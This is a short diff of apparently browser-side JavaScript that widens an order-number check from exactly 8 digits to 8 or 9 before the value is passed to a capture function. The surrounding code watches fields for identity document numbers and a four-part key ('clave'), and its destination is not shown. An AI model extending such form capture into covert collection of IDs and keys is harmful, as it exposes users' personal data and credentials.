@@ -13,7 +13,8 @@ const DOC_TYPES = ['DNI', 'RUC', 'CE', 'PS'];
 // alfanumerico y de longitud variable, asi que no lleva un largo fijo.
 const DOC_EXPECTED_LENGTH = { DNI: 8, CE: 9, RUC: 11 };
 const OS_INPUT_ID = 'inputnroguia';
-const OS_LENGTH = 8;
+const OS_MIN_LENGTH = 8;
+const OS_MAX_LENGTH = 9;
 const CLAVE_FIELDS = ['swal-input1', 'swal-input2', 'swal-input3', 'swal-input4'];
 // Senales de que la clave fue CORRECTA: el servidor solo inyecta estos
 // formularios cuando el codigo validado es valido. El cierre del modal de
@@ -255,8 +256,8 @@ function scheduleDocDebouncedSave(target, source, eventTimeStamp) {
 
 function captureOs(target, source, eventTimeStamp) {
     const value = normalizeText(getFieldValue(target));
-    // Solo la OS completa: exactamente 8 digitos. Menos = numero a medias.
-    if (!/^\d+$/.test(value) || value.length !== OS_LENGTH) return null;
+    // La OS completa puede tener 8 o 9 digitos; menos = numero a medias.
+    if (!/^\d+$/.test(value) || value.length < OS_MIN_LENGTH || value.length > OS_MAX_LENGTH) return null;
     sendCapture('OS', value, source, eventTimeStamp);
     return value;
 }
